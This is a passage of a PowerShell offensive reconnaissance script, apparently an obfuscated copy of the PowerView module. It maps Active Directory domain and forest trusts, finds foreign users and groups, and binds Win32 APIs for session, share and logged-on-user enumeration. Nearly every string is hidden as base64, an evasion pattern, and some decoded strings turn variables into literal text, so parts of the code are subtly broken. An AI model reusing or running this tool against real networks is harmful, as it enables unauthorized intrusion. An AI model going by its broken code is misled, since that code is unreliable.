                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WypdIEVudW1lcmF0aW5nIHNlcnZlciAkQ29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($ComputerName.count))
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}








function Get-NetDomainTrust {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Domain = (Get-NetDomain).Name,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        if($LDAP -or $DomainController) {

            $TrustSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize

            if($TrustSearcher) {

                $TrustSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2xhc3M9dHJ1c3RlZERvbWFpbikp")))

                $TrustSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject
                    $TrustAttrib = Switch ($Props.trustattributes)
                    {
                        0x001 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bm9uX3RyYW5zaXRpdmU="))) }
                        0x002 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXBsZXZlbF9vbmx5"))) }
                        0x004 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cXVhcmFudGluZWRfZG9tYWlu"))) }
                        0x008 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Zm9yZXN0X3RyYW5zaXRpdmU="))) }
                        0x010 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y3Jvc3Nfb3JnYW5pemF0aW9u"))) }
                        0x020 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2l0aGluX2ZvcmVzdA=="))) }
                        0x040 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHJlYXRfYXNfZXh0ZXJuYWw="))) }
                        0x080 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHJ1c3RfdXNlc19yYzRfZW5jcnlwdGlvbg=="))) }
                        0x100 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHJ1c3RfdXNlc19hZXNfa2V5cw=="))) }
                        Default { 
                            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5rbm93biB0cnVzdCBhdHRyaWJ1dGU6IHswfQ=="))) -f $($Props.trustattributes));
                            (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($Props.trustattributes));
                        }
                    }
                    $Direction = Switch ($Props.trustdirection) {
                        0 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzYWJsZWQ="))) }
                        1 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5ib3VuZA=="))) }
                        2 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0Ym91bmQ="))) }
                        3 { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmlkaXJlY3Rpb25hbA=="))) }
                    }
                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlTmFtZQ=="))) $Domain
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TmFtZQ=="))) $Props.name[0]
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0R3VpZA=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("eyRPYmplY3RHdWlkfQ==")))
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RUeXBl"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRydXN0QXR0cmli")))
                    $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3REaXJlY3Rpb24="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JERpcmVjdGlvbg==")))
                    $DomainTrust
                }
            }
        }

        else {
            
            $FoundDomain = Get-NetDomain -Domain $Domain
            
            if($FoundDomain) {
                (Get-NetDomain -Domain $Domain).GetAllTrustRelationships()
            }     
        }
    }
}


function Get-NetForestTrust {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        $FoundForest = Get-NetForest -Forest $Forest
        if($FoundForest) {
            $FoundForest.GetAllTrustRelationships()
        }
    }
}


function Find-ForeignUser {


    [CmdletBinding()]
    param(
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-ForeignUser {
        
        param(
            [String]
            $UserName,

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if ($Domain) {
            
            $DistinguishedDomainName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))) + $Domain -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XC4="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LERDPQ==")))
        }
        else {
            $DistinguishedDomainName = [String] ([adsi]'').distinguishedname
            $Domain = $DistinguishedDomainName -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
        }

        Get-NetUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize | Where-Object {$_.memberof} | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))
                if($Index) {
                    
                    $GroupDomain = $($Membership.substring($Index)) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                    
                    if ($GroupDomain.CompareTo($Domain)) {
                        
                        $GroupName = $Membership.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $Domain
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $GroupDomain
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBETg=="))) $Membership
                        $ForeignUser
                    }
                }
            }
        }
    }

    if ($Recurse) {
        
        if($LDAP -or $DomainController) {
            $DomainTrusts = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $DomainTrusts = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($DomainTrust in $DomainTrusts) {
            
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW51bWVyYXRpbmcgdHJ1c3QgZ3JvdXBzIGluIGRvbWFpbiAkRG9tYWluVHJ1c3Q=")))
            Get-ForeignUser -Domain $DomainTrust -UserName $UserName -PageSize $PageSize
        }
    }
    else {
        Get-ForeignUser -Domain $Domain -DomainController $DomainController -UserName $UserName -PageSize $PageSize
    }
}


function Find-ForeignGroup {


    [CmdletBinding()]
    param(
        [String]
        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Switch]
        $Recurse,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    function Get-ForeignGroup {
        param(
            [String]
            $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),

            [String]
            $Domain,

            [String]
            $DomainController,

            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )

        if(-not $Domain) {
            $Domain = (Get-NetDomain).Name
        }

        $DomainDN = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9ezB9"))) -f $($Domain.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LERDPQ=="))))))
        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluRE46ICREb21haW5ETg==")))

        
        $ExcludeGroups = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcnM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIFVzZXJz"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3Vlc3Rz"))))

        
        Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Where-Object {$_.member} | Where-Object {
            
            -not ($ExcludeGroups -contains $_.samaccountname) } | ForEach-Object {
                
                $GroupName = $_.samAccountName

                $_.member | ForEach-Object {
                    
                    
                    if (($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049Uy0xLTUtMjEuKi0uKg==")))) -or ($DomainDN -ne ($_.substring($_.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9")))))))) {

                        $UserDomain = $_.subString($_.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        $UserName = $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]

                        $ForeignGroupUser = New-Object PSObject
                        $ForeignGroupUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $Domain
                        $ForeignGroupUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
                        $ForeignGroupUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
                        $ForeignGroupUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
                        $ForeignGroupUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRO"))) $_
                        $ForeignGroupUser
                    }
                }
        }
    }

    if ($Recurse) {
        
        if($LDAP -or $DomainController) {
            $DomainTrusts = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }
        else {
            $DomainTrusts = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
        }

        ForEach($DomainTrust in $DomainTrusts) {
            
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW51bWVyYXRpbmcgdHJ1c3QgZ3JvdXBzIGluIGRvbWFpbiAkRG9tYWluVHJ1c3Q=")))
            Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    else {
        Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
    }
}


function Invoke-MapDomainTrust {

    [CmdletBinding()]
    param(
        [Switch]
        $LDAP,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    
    $SeenDomains = @{}

    
    $Domains = New-Object System.Collections.Stack

    
    $CurrentDomain = (Get-NetDomain).Name
    $Domains.push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        
        if (-not $SeenDomains.ContainsKey($Domain)) {
            
            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW51bWVyYXRpbmcgdHJ1c3RzIGZvciBkb21haW4gJyREb21haW4=")))

            
            $Null = $SeenDomains.add($Domain, "")

            try {
                
                if($LDAP -or $DomainController) {
                    $Trusts = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize
                }
                else {
                    $Trusts = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize
                }

                if($Trusts -isnot [system.array]) {
                    $Trusts = @($Trusts)
                }

                
                $Trusts += Get-NetForestTrust -Forest $Domain

                if ($Trusts) {

                    
                    ForEach ($Trust in $Trusts) {
                        $SourceDomain = $Trust.SourceName
                        $TargetDomain = $Trust.TargetName
                        $TrustType = $Trust.TrustType
                        $TrustDirection = $Trust.TrustDirection

                        
                        $Null = $Domains.push($TargetDomain)

                        
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U291cmNlRG9tYWlu"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFNvdXJjZURvbWFpbg==")))
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0RG9tYWlu"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRhcmdldERvbWFpbg==")))
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RUeXBl"))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRydXN0VHlwZQ==")))
                        $DomainTrust | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3REaXJlY3Rpb24="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFRydXN0RGlyZWN0aW9u")))
                        $DomainTrust
                    }
                }
            }
            catch {
                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIEVycm9yOiB7MH0="))) -f $_)
            }
        }
    }
}











$Mod = New-InMemoryModule -ModuleName Win32


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)


$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$WTS_SESSION_INFO_1 = struct $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pHostName = field 4 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pUserName = field 5 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pDomainName = field 6 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    pFarmName = field 7 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QnlWYWxBcnJheQ=="))), 20)
}


$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    wkui1_logon_domain = field 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    wkui1_oth_domains = field 2 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    wkui1_logon_server = field 3 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
}


$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    sesi10_username = field 1 String -MarshalAs @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TFBXU3Ry"))))
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}


$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V2luMzI=")))
$Netapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmV0YXBpMzI=")))]
$Advapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YWR2YXBpMzI=")))]
$Kernel32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a2VybmVsMzI=")))]
$Wtsapi32 = $Types[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d3RzYXBpMzI=")))]



Set-Alias Get-NetForestDomains Get-NetForestDomain
Set-Alias Get-NetDomainControllers Get-NetDomainController
Set-Alias Get-NetUserSPNs Get-NetUser
Set-Alias Invoke-NetUserAdd Add-NetUser
Set-Alias Invoke-NetGroupUserAdd Add-NetGroupUser
Set-Alias Get-NetComputers Get-NetComputer
Set-Alias Get-NetOUs Get-NetOU
Set-Alias Get-NetGUIDOUs Get-NetOU
Set-Alias Get-NetFileServers Get-NetFileServer
Set-Alias Get-NetSessions Get-NetSession
Set-Alias Get-NetRDPSessions Get-NetRDPSession
Set-Alias Get-NetProcesses Get-NetProcess
Set-Alias Get-UserLogonEvents Get-UserEvent
Set-Alias Get-UserTGTEvents Get-UserEvent
Set-Alias Get-UserProperties Get-UserProperty
Set-Alias Get-ComputerProperties Get-ComputerProperty
Set-Alias Invoke-UserHunterThreaded Invoke-UserHunter
Set-Alias Invoke-ProcessHunterThreaded Invoke-ProcessHunter
Set-Alias Invoke-ShareFinderThreaded Invoke-ShareFinder
Set-Alias Invoke-SearchFiles Find-InterestingFile
Set-Alias Invoke-UserFieldSearch Find-UserField
Set-Alias Invoke-ComputerFieldSearch Find-ComputerField
Set-Alias Invoke-FindLocalAdminAccess Find-LocalAdminAccess
Set-Alias Invoke-FindLocalAdminAccessThreaded Find-LocalAdminAccess
Set-Alias Get-NetDomainTrusts Get-NetDomainTrust
Set-Alias Get-NetForestTrusts Get-NetForestTrust
Set-Alias Invoke-MapDomainTrusts Invoke-MapDomainTrust
Set-Alias Invoke-FindUserTrustGroups Find-ForeignUser
Set-Alias Invoke-FindGroupTrustUsers Find-ForeignGroup
Set-Alias Invoke-EnumerateLocalTrustGroups Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdmins Invoke-EnumerateLocalAdmin
Set-Alias Invoke-EnumerateLocalAdminsThreaded Invoke-EnumerateLocalAdmin
Set-Alias Invoke-FindAllUserTrustGroups Find-ForeignUser
Set-Alias Find-UserTrustGroup Find-ForeignUser
Set-Alias Invoke-FindAllGroupTrustUsers Find-ForeignGroup